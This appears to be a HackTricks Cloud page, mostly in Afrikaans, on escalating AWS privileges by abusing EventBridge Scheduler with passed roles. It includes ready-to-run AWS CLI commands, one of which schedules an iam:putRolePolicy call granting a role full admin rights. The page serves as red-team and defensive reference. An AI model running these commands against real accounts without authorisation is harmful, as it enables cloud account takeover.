# AWS - EventBridge Scheduler Privesc

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## EventBridge Scheduler

EventBridge Scheduler kan gebruik word vir privilige eskalasie deur oproepe na verskeie AWS dienste te skeduleer. Deur sy vermo√´ om dienste op 'n geskeduleerde basis aan te roep, kan gebruikers met voldoende toestemmings privilige eskaleer. Hier is 'n paar van die sleutel aksies wat EventBridge Scheduler kan aktiveer met behulp van getemplateerde teikens:

- Lambda: lambda:InvokeFunction - Roep Lambda funksies op 'n skedule aan.
- CodeBuild: codebuild:StartBuild - Begin AWS CodeBuild projekte.
- CodePipeline: codepipeline:StartPipelineExecution - Aktiveer AWS CodePipeline uitvoerings.
- ECS: ecs:RunTask - Voer ECS take uit.
- EventBridge: events:PutEvents - Plaas gebeurtenisse in EventBridge.
- Inspector: inspector:StartAssessmentRun - Begin Amazon Inspector assesserings.
- Kinesis: kinesis:PutRecord - Plaas rekords in Kinesis strome.
- Firehose: firehose:PutRecord - Plaas rekords in Firehose afleweringsstrome.
- SageMaker: sagemaker:StartPipelineExecution - Begin SageMaker pypaak uitvoerings.
- SNS: sns:Publish - Publiseer boodskappe na SNS onderwerpe.
- SQS: sqs:SendMessage - Stuur boodskappe na SQS rye.
- Step Functions: states:StartExecution - Begin uitvoerings van AWS Step Functions.

Dit is net 'n paar van die getemplateerde aksies wat EventBridge Scheduler kan uitvoer. egter, deur universele teikens te gebruik, kan baie ander aksies oor AWS dienste geaktiveer word. Universele teikens stel meer uitgebreide API operasies moontlik buite die getemplateerde lys.

Meer inligting oor EventBridge Scheduler in:

{% content-ref url="../aws-services/eventbridgescheduler-enum.md" %}
[eventbridgescheduler-enum.md](../aws-services/eventbridgescheduler-enum.md)
{% endcontent-ref %}

### `sts:AssumeRole`, `iam:PassRole`, (`scheduler:CreateSchedule` | `scheduler:UpdateSchedule`)

Gebruikers met `sts:AssumeRole`, `iam:PassRole`, en `scheduler:CreateSchedule of scheduler:UpdateSchedule` toestemmings kan privilige eskaleer deur die EventBridge Scheduler te benut om dienste aan te roep met 'n rol met ho√´r privilige.

Met hierdie toestemmings kan 'n aanvaller 'n rol met verhoogde privilige aanvaar en daardie rol aan EventBridge Scheduler oorhandig wanneer 'n skedule geskep of opgedateer word. Die skedule kan geconfigureer word om enige van die aksies wat vroe√´r gelys is, uit te voer, soos om Lambda funksies aan te roep, ECS take te begin, CodePipeline uitvoerings te aktiveer, of enige operasie van die 270 AWS dienste wat deur EventBridge Scheduler ondersteun word. Deur hierdie aksies te skeduleer, kan 'n aanvaller ho√´r privilige misbruik om ongeoorloofde operasies oor AWS dienste uit te voer.
\\

Byvoorbeeld, hulle kan die skedule configureer om 'n Lambda funksie aan te roep wat 'n getemplateerde aksie is:
```bash
aws scheduler create-schedule \
--name MyLambdaSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:lambda:<region>:<account-id>:function:<LambdaFunctionName>",
"RoleArn": "arn:aws:iam::<account-id>:role/<RoleName>"
}'
```
In addision to templated service actions, you can use universal targets in EventBridge Scheduler to invoke a wide range of API operations for many AWS services. Universal targets offer flexibility to invoke almost any API. One example can be using universal targets adding "AdminAccessPolicy", using a role that has "putRolePolicy" policy:
```bash
aws scheduler create-schedule \
--name GrantAdminToTargetRoleSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:scheduler:::aws-sdk:iam:putRolePolicy",
"RoleArn": "arn:aws:iam::<account-id>:role/RoleWithPutPolicy",
"Input": "{\"RoleName\": \"TargetRole\", \"PolicyName\": \"AdminAccessPolicy\", \"PolicyDocument\": \"{\\\"Version\\\": \\\"2012-10-17\\\", \\\"Statement\\\": [{\\\"Effect\\\": \\\"Allow\\\", \\\"Action\\\": \\\"*\\\", \\\"Resource\\\": \\\"*\\\"}]}\"}"
}'
```
## Verwysings

* [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html)

* [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html)

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
